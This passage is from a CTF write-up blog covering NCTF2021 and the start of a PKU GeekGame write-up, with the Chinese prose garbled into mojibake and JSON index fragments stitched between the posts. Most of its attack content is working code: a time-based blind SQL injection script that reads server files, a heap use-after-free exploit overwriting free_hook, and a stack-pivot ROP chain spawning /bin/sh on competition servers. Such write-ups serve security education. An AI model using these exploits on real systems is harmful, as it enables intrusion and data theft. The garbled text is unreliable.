¹æ®éœ€è¦è°ƒæ•´ä¸€ä¸‹å°±è¡Œã€‚ï¼ˆ # MiaoTony import requests import time import string url = r'http://xxxxxx:xxxx/public/index.php/index/m1saka_m1yuu/index' s = r'{}&lt;&gt;?. ' + string.ascii_letters + string.digits + r'!@#$%^&amp;*()_-+=\"\\'\\\\/' flag = '' for i in range(1, 100): for j in s: payload = f'select(substr(load_file(\"/var/www/html/ffllaagg.php\"),{i},1))={hex(ord(j))}' # print(payload) param = {'username[0]': 'exp', 'username[1]': f'if(({payload}),sleep(1.5),0)'} t = time.time() r = requests.get(url, params=param) if time.time() - t &gt; 1: flag += j print(f'[+] {i} {j} {flag}') break # username[0]=exp&amp;username[1]=if((select(substr(load_file(\"/var/www/html/ffllaagg.php\"),1,1))=0x3c),sleep(3),0) # username[0]=exp&amp;username[1]=sleep(if((select(substr(load_file(\"/var/www/html/ffllaagg.php\"),1,1))=0x3c),3,0)) å®Œäº‹ã€‚ å¦å¤–æœ¬åœ°è¿˜å¯ä»¥æŠŠ config.php é‡Œçš„ debug å’Œ trace æ”¹æˆ trueï¼Œæ¥è°ƒè¯•çœ‹çœ‹è°ƒç”¨æ ˆã€‚ æ¯”å¦‚æ•…æ„åœ¨ SQL é‡ŒåŠ ä¸ª 'ï¼Œç„¶åçœ‹çœ‹ã€‚ Pwnezheap é¢˜ç›®æè¿°: æ€»ä¹‹å°±æ˜¯éå¸¸ç®€å• nc 129.211.173.64 10002 é™„ä»¶é“¾æ¥: http://download.kagehutatsu.com/Download/ezheap.zip https://attachment.h4ck.fun:9000/pwn/ezheap/ezheap.zip https://nctf.slight-wind.com/pwn/ezheap/ezheap.zip ç®€å•uafï¼Œç›´æ¥æ‰“free_hook from pwn import * context.log_level = 'debug' # sh = process('./ezheap') sh = remote('129.211.173.64',10002) def menu(choice): sh.recvuntil(\"&gt;&gt; \") sh.sendline(str(choice)) def add(size, content): menu(1) sh.recvuntil(': ') sh.sendline(str(size)) sh.recvuntil(': ') sh.send(content) def edit(idx, content): menu(2) sh.recvuntil(': ') sh.sendline(str(idx)) sh.recvuntil(': ') sh.send(content) def delte(idx): menu(3) sh.recvuntil(': ') sh.sendline(str(idx)) def show(idx): menu(4) sh.recvuntil(': ') sh.sendline(str(idx)) for i in range(30): add(0x70, b'a'*0x70) delte(0) show(0) heap_base = u64(sh.recv(8)) &lt;&lt; 12 log.success('heapbase: ' + hex(heap_base)) for i in range(1,7): delte(i) delte(7) delte(8) delte(7) for i in range(7): add(0x70,'d'*0x70) add(0x70, 'c'*0x70) edit(15, p64((heap_base + 0x290) ^ (heap_base &gt;&gt; 12))+b'\\n') add(0x70, b'a'*0x70) add(0x70, b'a'*0x70) add(0x70, p64(0) + p64(0x481) + b'\\n') delte(0) show(0) libc_base = u64(sh.recv(8)) - 0x1e0c00 log.success('libc_base: ' + hex(libc_base)) system = libc_base + 0x00000000004fa60 binsh_str = libc_base + 0x00000000001abf05 free_hook = libc_base + 0x0000000001e3e20 add(0x70, 'c'*0x70) delte(0) edit(15, p64((0) ^ (heap_base &gt;&gt; 12)) + p64(0)+b'\\n') delte(0) edit(15, p64((0) ^ (heap_base &gt;&gt; 12)) + p64(0)+b'\\n') delte(0) edit(15, p64((free_hook) ^ (heap_base &gt;&gt; 12))+b'\\n') add(0x70, b'a'*0x70) add(0x70, p64(system) + b'\\n') add(0x20, '/bin/sh\\x00') delte(15) sh.interactive() login é¢˜ç›®æè¿°: Welcome, it's ez nc 129.211.173.64 10005 é™„ä»¶é“¾æ¥: http://download.kagehutatsu.com/Download/login.zip https://attachment.h4ck.fun:9000/pwn/login/login.zip https://nctf.slight-wind.com/pwn/login/login.zip æ ˆæº¢å‡ºï¼Œä½¿ç”¨æ ˆè¿ç§»ï¼Œç„¶åè°ƒç”¨syscall from pwn import * # sh = process('./login') sh = remote('129.211.173.64',10005) syscall = 0x0000000000110628 close_plt = 0x401090 bin_sh_addr = 0x404800 retn_addr = 0x401220 pop_rsi_r15_ret = 0x0000000000401291 pop_rdi_ret = 0x0000000000401293 addr = 0x40128A read_plt = 0x4010A0 # gdb.attach(sh) sh.recvuntil('Welcome to NCTF2021!\\n') bss = 0x404500 main = 0x4011ED payload = b'a'*0x100 payload += p64(bss) payload += p64(main) sh.send(payload) # sh.recvuntil('Welcome to NCTF2021!\\n') sleep(0.2) payload = p64(0) + p64(1) + p64(0) + p64(0x0000000000404028) payload += p64(0x2) + p64(0x404400 + 0x38) + p64(0x401270) + p64(read_plt) payload += p64(0) + p64(1) + p64(0) + p64(0x404900) + p64(0x3b) + p64(0x404400 + 0x78) + p64(0x401270) + p64(read_plt) payload += p64(0) + p64(0x4044f8) + p64(0x4044f8) + p64(0) + p64(0) + p64(0x404400 + 0xb8) + p64(0x401270) + p64(close_plt) payload = payload.ljust(0xf8, b'a') + b'/bin/sh\\x00' sh.send(payload + p64(bss - 0x110) + p64(0x4011ED)) sleep(0.2) payload = b'a' * 0x108 + p64(0x40128A) sh.send(payload) sleep(0.5) sh.send(b'\\x28\\x56') sleep(0.5) sh.send(b'a' * 0x3b) sh.interactive() ''' 0xe6c7e execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL 0xe6c81 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL 0xe6c84 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL 0x270b3 ''' ReverseHello ã›ã‹ã„ é¢˜ç›®æè¿°: æ¬¢è¿æ¥åˆ°NCTF-é€†å‘å·¥ç¨‹(Reverse Engineering) è¿™é‡Œå¯èƒ½æœ‰ä½ éœ€è¦çš„å·¥å…·: ida pro 7.6 :é“¾æ¥ï¼šhttps://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg æå–ç ï¼šo49x é™„ä»¶é“¾æ¥: é“¾æ¥ï¼šhttps://pan.baidu.com/s/1qPHbnzNrg-8ocG2CkYh_4w æå–ç ï¼šmbxp https://attachment.h4ck.fun:9000/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-RE.zip https://nctf.slight-wind.com/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-RE.zip flag å¦‚å›¾æ‰€ç¤º Shadowbringer é¢˜ç›®æè¿°: One brings shadow, one brings light. Two-toned echoes, tumbling through time. Threescore wasted, ten cast aside. Four-fold knowing, no end in sight. ---EZCPP FOR YOU, JUST HAVE FUN!--- é™„ä»¶é“¾æ¥: é“¾æ¥ï¼šhttp://39.102.33.27:5212/#/s/rwSw https://upyun.clq0.top/Shadowbringer.exe æœ¬è´¨ä¸Šä¸ºè‡ªåˆ¶åŒé‡base64ï¼Œè¿ç»­ä¿®æ”¹äº†ä¿©è¡¨ï¼Œåè¿‡æ¥è¿ç®—å³å¯ table = \"#$%&amp;'()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab\" # ans_index = [8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31,43, 36, 3, 21, 65, 65] # table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\" def find_real_string(): return ''.join(table[i-1] for i in ans_index) #!/usr/bin/env python3 def myBase64Encode(preCoding): charTable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #å­—ç¬¦è¡¨ if len(preCoding) &lt; 0: return '' #å­—ç¬¦ä¸²ä¸ºç©ºåˆ™è¿”å›ç©º lackCharNums = 3 - len(preCoding) % 3 if lackCharNums == 3 : lackCharNums = 0 #æ•´é™¤è¯´æ˜ä¸ç¼ºå­—ç¬¦ #å¾…è½¬æ¢å­—ç¬¦ä¸æ˜¯3çš„å€æ•°çš„æƒ…å†µè¡¥å…¨å®ƒ for i in range(lackCharNums) : preCoding = preCoding + b'\\x00' result = '' #ç”¨äºä¿å­˜æœ€ç»ˆç»“æœçš„stræ•°æ® rp = '' #å¤„ç†è¡¥å…¨å­—ç¬¦æ—¶çš„æš‚å­˜å˜é‡ #æ¯ä¸‰ä¸ªå­—ç¬¦å¤„ç†ä¸€è½® for i in range(int(len(preCoding) / 3)): threeChar = preCoding[i * 3 : i * 3 + 3] #å–ä¸‰ä¸ªå­—ç¬¦å‡ºæ¥ tCode = '' #ç”¨äºå­˜æ”¾ä¸‰ä¸ªå­—ç¬¦æ‹¼æ¥åçš„äºŒè¿›åˆ¶æ•°å€¼ æ–‡æœ¬å½¢å¼ pCode = '' #æš‚å­˜å˜é‡ for j in range(3) : pCode = bin(threeChar[j])[2 :] #æŠŠçœç•¥çš„0è¡¥ä¸Š lackZeroNums = 8 - len(pCode) #çœç•¥çš„0çš„ä¸ªæ•° for x in range(lackZeroNums): pCode = '0' + pCode tCode = tCode + pCode pCode = '' for j in range(4): #æ¯6ä½ä¸€ä¸ªå­—ç¬¦ pCode = tCode[j * 6 : j * 6 + 6] rp = rp + charTable[int(pCode, 2)] #å¤„ç†è¡¥å…¨çš„00å­—ç¬¦ result = rp[: len(rp) - lackCharNums] for j in range(lackCharNums): result = result + '=' return bytes(result, encoding = \"utf-8\") def myBase64Decode(encodedBin) : charTable = \"#$%&amp;\\x27()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab\\x00\" #å­—ç¬¦è¡¨ #å¦‚æœå­—ç¬¦ä¸æ˜¯4çš„å€æ•° è¿”å›ç©º if not len(encodedBin) % 4 == 0 : return '' tCode = '' #ç”¨äºå­˜æ”¾æœ€ç»ˆçš„äºŒè¿›åˆ¶æ–‡æœ¬å­—ç¬¦ä¸² pCpde = '' #æš‚å­˜å˜é‡ #éå†encodedBinæ¯ä¸€ä¸ªå­—ç¬¦ for i in encodedBin: for j in range(len(charTable)): #æ‰¾åˆ°è¡¨ä¸­å¯¹åº”åæ ‡ if chr(i) == charTable[j]: pCode = bin(j)[2 :] #è½¬äºŒè¿›åˆ¶å»é™¤å¼€å¤´çš„0b lackZeroNums = 6 - len(pCode) #çœç•¥çš„0çš„ä¸ªæ•° for x in range(lackZeroNums): pCode = '0' + pCode tCode = tCode + pCode pCode = '' result = '' #å‚¨å­˜æœ€ç»ˆç»“æœ print(tCode) for i in range(int(len(tCode) / 8)): pCode = tCode[i * 8 : i * 8 + 8] result = result + chr(int(pCode, 2)) return bytes(result, encoding = \"utf-8\") # print(myBase64Encode(b\"helloworld\")) # print(myBase64Decode(b\"U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!\")) tmp = b'6G074JP+s)WV:Z+T&lt;&amp;(Q18`Ks)WV:Y4hs9[h:YCS?&amp;0`' print(myBase64Decode(tmp)) é²¨é²¨çš„ç§˜å¯† é¢˜ç›®æè¿°: å¬è¯´è¿™æ˜¯ç‹—ç‹—çš„ç§˜å¯† é™„ä»¶é“¾æ¥: é“¾æ¥ï¼šhttp://39.102.33.27:5212/#/s/D3Un https://upyun.clq0.top/attachment_1.exe ç”¨äº†ä¸€ä¸ªä¸€æ¬¡æ‰§è¡Œä¸€å¥è¯çš„æ±‡ç¼–å®ç°çš„CRC32ï¼Œçˆ†ç ´å³å¯è·å¾—ç­”æ¡ˆ: import zlib result = [ -1057595298, 11628042, 857318098, 1472903095, -1704694372, -1109907674, -667354223, -1914631245, 392891821, 1751113455, 740292529, 1816412822, -1587741040, 550340385, 1654029544, 739656189, 1462570906, -1370301396, 1346993615, -9781430] def find_str(index): for i in range(128): for j in range(128): tmp = bytes([i,j]) res = zlib.crc32(tmp) % (1&lt;&lt;32) if res == (result[index] % (1&lt;&lt;32)): return chr(i)+chr(j) # else: # return \"ERROR\" index = 0 ans = '' while index &lt; len(result): ans += find_str(index) index += 1 print(index) print(ans) å°ç»“å•Šå•Šå•Šå•Šå•Šï¼Œè¿™æ¯”èµ› web é¢˜ç›®å¤ªéš¾äº†å§ï¼ï¼ï¼ï¼ Misc é‚£ä¸ª python è¿‡æ»¤ ( ä¸‹çš„å‘½ä»¤æ‰§è¡Œè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œå­¦åˆ°äº†è®¸å¤šã€‚ Web å’‹ä¸€å † Java å•Šï¼Œæ¬ºè´Ÿå–µå–µä¸ä¼š Javaï¼Œå˜¤å˜¤å˜¤ã€‚è¿˜æœ‰ä¿© XSSï¼Œä¸€ä¸ª NodeJS ä¸€ä¸ª Golangï¼Œæœ¬æ¥è¿˜æƒ³åšåšçš„ï¼Œè¯•äº†è¯•ä¸ä¼šï¼Œçœ‹äº†æç¤ºæ ¹æœ¬æ²¡æƒ³åˆ°æ˜¯å•¥ä¸œè¥¿ï¼Œæ‘¸äº†ï¼Œå¤ªé¡¶äº†ï¼ Reverse æœ‰ä¸ª mobile çš„é¢˜ç›®ï¼Œçœ‹ wp åº”è¯¥æ¯” web ç®€å•ï¼Œè¦ä¸æ˜¯ä»–æ’åœ¨æœ€åä¸€é¢˜çš„ä½ç½®ï¼Œæ—©çŸ¥é“å°±å»çœ‹ä»–äº†ï¼ˆå®³ï¼Œä¸å°±æ˜¯å–µå–µå¤ªèœäº†æƒ³å¤šåšå‡ é¢˜ webï¼ŒCrypto å’±ä¹Ÿä¸ä¼šï¼Œå”‰ å¤§å®¶çœ‹çœ‹ web æœ€åçš„è§£é¢˜æƒ…å†µï¼Œæ¥è‡ªç¾¤å‹çš„æˆªå›¾â€”â€” æœ€åå’±æ‹¿äº†ç¬¬12åã€‚å”‰ï¼Œå¤ªèœäº†ã€‚ ï¼ˆè™½ç„¶æœ€ç»ˆæ’åç¬¬14æ¥ç€ï¼Œåº”è¯¥æ˜¯æœ‰é“é¢˜è¸©ç‚¹æ²¡äº¤ä¸Šå»8ï¼Œé—®é¢˜ä¸å¤§ æ€ä¹ˆè¯´å‘¢ï¼Œæœ¬æ¥è¿˜è¯´æƒ³æ¥æ°çƒ‚é’±çš„ï¼Œç»“æœå•¥ä¹Ÿæ²¡æ°åˆ°ï¼Œå¥½äºå•Šå•Šå•Šå•Šï¼ æ‘†çƒ‚äº†æ‘†çƒ‚äº†ã€‚å½“ç„¶ï¼Œè¿˜è¦æ„Ÿè°¢é˜Ÿå‹ä¸€èµ·æ¥ç©ã€‚ å®˜æ–¹ Writeupï¼š NCTF2021 Official Writeup ï¼ˆGitHub archiveï¼‰ è¿˜æ˜¯å¥½å¥½å­¦ä¹ å­¦ä¹ ã€‚ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/11/30/CTF_2021NCTF/"},{"title":"CTF | 2021 PKU GeekGame 1st WriteUp","text":"å‰è¨€PKU GeekGame æ¥äº†ã€‚ åŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ› åœ¨2021å¹´5æœˆæ›¾ä¸¾åŠäº†å…·æœ‰è¯•æ°´æ€§è´¨çš„â€œç¬¬é›¶å±Šâ€ç«èµ›ï¼Œå› æ­¤æœ¬å±Šç«èµ›å‘½åä¸ºç¬¬ä¸€å±Šã€‚ æœ¬å±Šç«èµ›å°†ç»§ç»­è¿½æ±‚ é¢˜ç›®æ–°é¢–æœ‰è¶£ã€éš¾åº¦å…·æœ‰æ¢¯åº¦ï¼Œè®©æ²¡æœ‰ç›¸å…³ç»éªŒçš„æ–°ç”Ÿå’Œå…·æœ‰ä¸€å®šä¸“ä¸šåŸºç¡€çš„å­¦ç”Ÿéƒ½èƒ½äº«å—æ¯”èµ›ï¼Œåœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­æœ‰æ‰€æ”¶è·ã€‚ ç«èµ›çš„è€ƒå¯Ÿå†…å®¹æ¶‰åŠåˆ°ä¿¡æ¯å®‰å…¨çš„å„ä¸ªæ–¹é¢ï¼Œä¸»è¦åŒ…æ‹¬ï¼š Misc: åŸºæœ¬æŠ€èƒ½ï¼ˆå¸¸è§ç¼–ç ã€ä¿¡æ¯æ£€ç´¢åˆ©ç”¨èƒ½åŠ›ç­‰ï¼‰ Web: ç½‘ç«™å®‰å…¨ï¼ˆWeb æ¼æ´åˆ©ç”¨ã€JavaScript ç¼–ç¨‹ç­‰ï¼‰ Binary: äºŒè¿›åˆ¶å®‰å…¨ï¼ˆé€†å‘å·¥ç¨‹ã€ç¨‹åºè°ƒè¯•ç­‰ï¼‰ Algorithm: ç®—æ³•å®‰å…¨ï¼ˆç°ä»£å¯†ç å­¦ã€ç®—æ³•è®¾è®¡ç­‰ï¼‰ æ¯é“é¢˜ç›®çš„è€ƒå¯Ÿå†…å®¹å¯èƒ½ä¸å”¯ä¸€ï¼Œä»¥ä¸Šåˆ†ç±»ä»…ä¾›å‚è€ƒã€‚ èµ›ç¨‹å®‰æ’ æ¯”èµ›æ—¶é—´ä¸ºåŒ—äº¬æ—¶é—´ 11 æœˆ 13 æ—¥ï¼ˆå‘¨å…­ï¼‰12:00 åˆ° 20 æ—¥ï¼ˆå‘¨å…­ï¼‰12:00ï¼ŒæŒç»­ä¸€å‘¨æ—¶é—´ã€‚ ç«èµ›ä¸ºä¸ªäººçº¿ä¸Šè§£é¢˜èµ›ï¼Œé€‰æ‰‹éœ€è¦è§£å†³ä¸å®‰å…¨ç›¸å…³çš„è°œé¢˜è·å¾—ç­”æ¡ˆã€‚ æœ¬ç«èµ›ä¸ä¸“é—¨è®¾ç½®æŠ¥åç¯èŠ‚ï¼Œé€‰æ‰‹åœ¨æ¯”èµ›ç»“æŸå‰å¯ä»¥è‡ªç”±ç™»å½•æœ¬å¹³å° geekgame.pku.edu.cn å‚èµ›ã€‚ æœ¬å±Šç«èµ›å°†åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œæ—¶é•¿åˆ†åˆ«ä¸º 5 å¤©å’Œ 2 å¤©ã€‚åœ¨ç¬¬äºŒé˜¶æ®µå°†æ”¾å‡ºæç¤ºæˆ–é™ä½éš¾åº¦ï¼ŒåŒæ—¶åœ¨æ­¤é˜¶æ®µè§£å‡ºé¢˜ç›®å°†åªèƒ½è·å¾— 1/4 çš„åˆ†æ•°ã€‚é€šè¿‡ç¬¬äºŒé˜¶æ®µï¼Œå¸Œæœ›æ€è·¯å¡å£³çš„é€‰æ‰‹èƒ½å¤Ÿå€ŸåŠ©æç¤ºä¸ç•™é—æ†¾ï¼ŒåŒæ—¶èŒæ–°ä¹Ÿæœ‰æœºä¼šæŒ‘æˆ˜éš¾é¢˜ã€‚ æ¯”èµ›æ—¶é—´è¡¨ï¼š 13 æ—¥ï¼ˆå‘¨å…­ï¼‰12:00ï¼šæ¯”èµ›å¼€å§‹ï¼Œé¢˜ç›®å°†åœ¨å‰ä¸¤å¤©å†…åˆ†æ‰¹æ”¾å‡º 18 æ—¥ï¼ˆå‘¨å››ï¼‰12:00ï¼šæ¯”èµ›è¿›å…¥ç¬¬äºŒé˜¶æ®µï¼Œå°†æ”¾å‡ºæç¤ºæˆ–é™ä½éš¾åº¦ï¼Œåœ¨æ­¤é˜¶æ®µè·å¾—çš„åˆ†æ•°å°†å‡å°‘ 20 æ—¥ï¼ˆå‘¨å…­ï¼‰12:00ï¼šæ¯”èµ›ç»“æŸï¼Œå°†æ— æ³•å†æäº¤ç­”æ¡ˆï¼Œé¢˜ç›®ç¯å¢ƒå°†ç»§ç»­å¼€æ”¾ 21 æ—¥ï¼ˆå‘¨æ—¥ï¼‰22:00 å‰ï¼šæ ¡å†…æ’åå‰ 35 åçš„é€‰æ‰‹éœ€è¦æäº¤æ¯é“è§£å‡ºé¢˜ç›®çš„è§£é¢˜æŠ¥å‘Šï¼ˆWriteupï¼‰ æ¯”èµ›ç»“æŸåï¼šå°†ä¸¾åŠé¢å¥–å…¸ç¤¼ï¼Œå¹¶å…¬å¼€å®˜æ–¹ Writeup å’Œéƒ¨åˆ†ä¼˜ç§€é€‰æ‰‹ Writeup USTC Hackergame ç»“æŸäº†ï¼ŒåŒ—å¤§çš„ç¬¬ä¸€å±Š GeekGame æ¥äº†ã€‚ç„¶è€Œæ€»å…±ä¸¾åŠçš„æ¬¡æ•°å¹¶ä¸æ˜¯1è€Œæ˜¯2ï¼Œå› ä¸ºæ˜¯ä»0å¼€å§‹çš„ï¼ˆ23333 æƒ³ç€ hackergame æ²¡å¥½å¥½æ‰“ï¼Œäºæ˜¯å°±æ¥è¿™ä¸ªæ¯”èµ›çœ‹çœ‹é¢˜äº†å‘—ã€‚ç»“æœä¸€æ‰“è‡ªé—­å¥½å‡ å¤©ï¼Œéº»äº†ã€‚ æœ¬æ¥è¿™ç¯‡ writeup åº”è¯¥æ¯”èµ›ç»“æŸå°±å‘çš„ï¼Œä½†æ˜¯è¿˜æƒ³ç€å¤ç°å‡ ä¸ªé¢˜äºæ˜¯å°±å’•äº†ï¼Œä½†æ˜¯åæ¥å‘ç°ä¹Ÿæ²¡å•¥æ—¶é—´å¤ç°äº†ï¼Œå’•äº†å¥½ä¹…æƒ³æƒ³è¿˜æ˜¯ç›´æ¥å‘äº†å§ï¼ˆï¼ˆï¼ˆ â†’ç­¾åˆ°â†https://geekgame.pku.edu.cn/media/prob01_lwzltdrojur150zq.zip?token=xxx ç¼–è¾‘æ–‡å­—ï¼ŒæŠŠé‡Œé¢å†…å®¹å¤åˆ¶å‡ºæ¥ï¼Œç„¶åä¿©æ …æ æ‰‹å·¥è¡¥ä¸€ä¸‹ã€‚ fa{aeAGetTm@ekaev! lgHv__ra_ieGeGm_1} flag{Have_A_Great_Time@GeekGame_v1!} èŠ±çµ® æœ‰å¤©åœ¨å®éªŒå®¤ï¼Œæœ‰ä¸ªå­¦å¼Ÿæ¥çœ‹äº†çœ‹é¢˜ç›®ï¼Œæœ¬æ¥æƒ³ç­¾ä¸ªåˆ°çš„ï¼Œå‘ç°æ€ä¹ˆéƒ½æ•´ä¸å‡ºæ¥ï¼Œç„¶åæ‰¾åˆ°äº† å–µå–µä¹‹å‰å†™çš„ä¸€ç¯‡ wpï¼Œæ‰¾åˆ°äº†å½“æ—¶æ¯”å¯¹å­—ä½“çš„ç½‘ç«™ï¼Œç„¶åæ¯”å¯¹åˆ°äº†ç”¨çš„ Wingdings å­—ä½“ï¼Œä½†æ˜¯å‘ç° pdf ä¸å…¨ï¼Œäºæ˜¯æ²¡ç­¾ä¸Šåˆ°ï¼ˆæ‘Šæ‰‹.jpg å°åŒ—é—®ç­” Remake You é…±å–„äºä½¿ç”¨åç§æœç´¢å¼•æ“ï¼Œåˆ«äººä¸æ¸…æ¥šçš„çŸ¥è¯†å¥¹èƒ½ä¸€ç§’é’Ÿæœç´¢å‡ºæ¥ã€‚è¿™æ˜¯ä¼—äººçš†çŸ¥çš„äº‹å®ã€‚ You é…±çš„æœ‹å‹èœå®åœ¨åˆ·å¾€å¹´é¢˜çš„æ—¶å€™æ‰¾åˆ°äº†ä¸€ä»½æ²¡æœ‰ç­”æ¡ˆçš„èµ„æ–™ã€‚å¥¹æœ¬æƒ³è¯¢é—® You é…±ï¼Œä½†å¬è¯´ You é…±å·²ç»æ—©åœ¨ 5 æœˆä»½å°±æŠŠè¯¾ç¨‹è¾…å¯¼è¿™é¡¹ä¸šåŠ¡å¤–åŒ…ç»™äº†ä½ ã€‚ äºæ˜¯ï¼Œç°åœ¨èœå®æ‰‹æŒä¸¤æš Flagï¼Œå¸Œæœ›ä½ èƒ½å¸®å¥¹è§£ç­”è¿™äº›é¢˜ç›®ã€‚ä½ æ¯å°æ—¶å¯ä»¥æäº¤ä¸€æ¬¡ç­”æ¡ˆï¼Œç­”å¯¹è‡³å°‘ä¸€åŠå¯ä»¥è·å¾—ç¬¬ä¸€ä¸ª Flagï¼Œå…¨éƒ¨ç­”å¯¹å¯ä»¥è·å¾—ç¬¬äºŒä¸ª Flagã€‚ #1 åŒ—äº¬å¤§å­¦ç‡•å›­æ ¡åŒºæœ‰ç†ç§‘ 1 å·æ¥¼åˆ°ç†ç§‘ X å·æ¥¼ï¼Œä½†æ²¡æœ‰ç†ç§‘ (X+1) å·åŠä¹‹åçš„æ¥¼ã€‚X æ˜¯ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š ^\\d+$ 5 #2 ä¸Šä¸€å±Šï¼ˆç¬¬é›¶å±Šï¼‰æ¯”èµ›çš„æ€»æ³¨å†Œäººæ•°æœ‰å¤šå°‘ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š^\\d+$ ç«èµ›é‡‡å–ä¸ªäººçº¿ä¸Šèµ›çš„å½¢å¼ï¼Œä»5æœˆ16æ—¥è‡³23æ—¥ï¼Œåœ¨CTFèµ›åˆ¶çš„åŸºç¡€ä¸ŠåŠ å…¥ä¸€å®šçš„åŸºç¡€çŸ¥è¯†ç«èµ›ç­‰å†…å®¹ï¼Œå…±è®¾17é“ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›é¢˜ã€‚æœ¬æ¬¡å¤§èµ›å…±æœ‰407äººæ³¨å†Œå‚èµ›ï¼Œæœ‰æ•ˆé€‰æ‰‹334äººã€‚å†ç»ä¸ƒå¤©çš„ç´§å¼ æ¯”èµ›ï¼Œå¤§èµ›å…±å†³å‡ºä¸€ç­‰å¥–ä¸‰åã€äºŒç­‰å¥–ä¸ƒåã€ä¸‰ç­‰å¥–äºŒååã€æ–°ç”Ÿç‰¹åˆ«å¥–ä¸‰åã€â€œä¸€è¡€å¥–â€åä¸ƒäººæ¬¡ã€‚ via åŒ—äº¬å¤§å­¦ä¸¾åŠé¦–å±Šä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ› 407 #3 geekgame.pku.edu.cn çš„ HTTPS è¯ä¹¦æ›¾æœ‰ä¸€æ¬¡å¿˜è®°ç»­æœŸäº†ï¼Œå‘ç”Ÿè¿‡æœŸçš„æ—¶é—´æ˜¯ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š ^2021-\\d\\d-\\d\\dT\\d\\d:\\d\\d:\\d3\\+08:00$ https://crt.sh/?q=geekgame.pku.edu.cn https://crt.sh/?id=4362003382 2021-07-11T08:49:53+08:00 #4 2020 å¹´ DEFCON CTF èµ„æ ¼èµ›ç­¾åˆ°é¢˜çš„ flag æ˜¯ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š^.+{.+}$ https://archive.ooo/c/welcome-to-dc2020-quals/358/ https://s3.us-west-2.amazonaws.com/archive-ooo-public/public_files/7ea9b08d24b9ab179e901316db875cd3c08f27de29b8f8152ce298e26a2961be/welcome.txt OOO{this_is_the_welcome_flag} #5 åœ¨å¤§å°ä¸º 672328094 * 386900246 çš„æ–¹å½¢æ£‹ç›˜ä¸Šæ”¾ 3 æšï¼ˆç›¸åŒçš„ï¼‰çš‡åä¸”å®ƒä»¬äº’ä¸æ”»å‡»ï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š ^\\d+$ è¿™é¢˜ç¡¬æ˜¯åˆ°äº†æœ€åä¸€å¤©ä¹Ÿæ²¡æ‡‚æ€ä¹ˆåšã€‚ã€‚æŠŠä¸‰ï¼ˆnï¼‰çš‡åé—®é¢˜çœ‹äº†åˆçœ‹ï¼Œæ€ä¹ˆä¸€å † DFS å›æº¯å•¥çš„ï¼Œå–µå–µå¥½èœå•Šä¸æ‡‚ç®—æ³•ï¼Œå‘œå‘œã€‚ï¼ˆæ„Ÿè§‰æ˜¯æœ‰å¿…è¦å­¦å­¦ç®—æ³•äº† è€Œä¸”ï¼Œä¸€ç›´åœ¨æƒ³ä¸æ˜¯ n*n è¿™ç§æ­£æ–¹å½¢çš„æƒ…å†µè¯¥æ€ä¹ˆè§£å¥½å•Šâ€¦â€¦æ‘¸äº†ã€‚ ï¼ˆçŒœäº† 114514ï¼Œ1145141919810ï¼Œå‘ç°éƒ½ä¸æ˜¯ BTW, å˜‰ç„¶å•Šâ€¦â€¦ ç¬¬äºŒé˜¶æ®µæç¤º ä¸åŒçš„é¢†åŸŸæœ‰ä¸åŒçš„ä¸“ä¸šå·¥å…·ã€‚ä½ å¯èƒ½æ— æ³•ä¸€ä¸‹æ‰¾åˆ°ç­”æ¡ˆï¼Œä½†æ˜¯ä½ èƒ½æ‰¾åˆ°ä¸€ä¸ªå·¥å…·ï¼Œç„¶åç”¨è¿™ä¸ªå·¥å…·å¾—åˆ°ç­”æ¡ˆã€‚è¿™ä¸ªå·¥å…·å¯èƒ½æ˜¯æŸä¸ªä¿¡æ¯å…¬å¼€ç³»ç»Ÿï¼Œå¯èƒ½æ˜¯æŸä¸ªèµ„æ–™å­˜æ¡£ï¼Œå¯èƒ½æ˜¯æŸä¸ªåœ¨çº¿æŸ¥è¯¢æœåŠ¡ã€‚è€Œå¯¹äºæ•´æ•°æ•°åˆ—æ„æˆçš„æ•°å­¦é—®é¢˜æ¥è¯´ï¼Œè¿™ä¸ªè‘—åçš„å·¥å…·æ˜¯â€¦â€¦ æ•´æ•°æ•°åˆ—æ„æˆçš„æ•°å­¦é—®é¢˜ï¼Œå½“æ—¶æ²¡æƒ³åˆ°ï¼Œåªæ˜¯è°·æ­ŒæŸ¥äº† ä¸‰ä¸ªçš‡åï¼Œæ²¡æŸ¥åˆ°ï¼Œggã€‚ èµ›åæ‰çŸ¥é“åŸæ¥è¯´çš„æ˜¯ OEISï¼ŒThe On-Line Encyclopedia of Integer SequencesÂ® 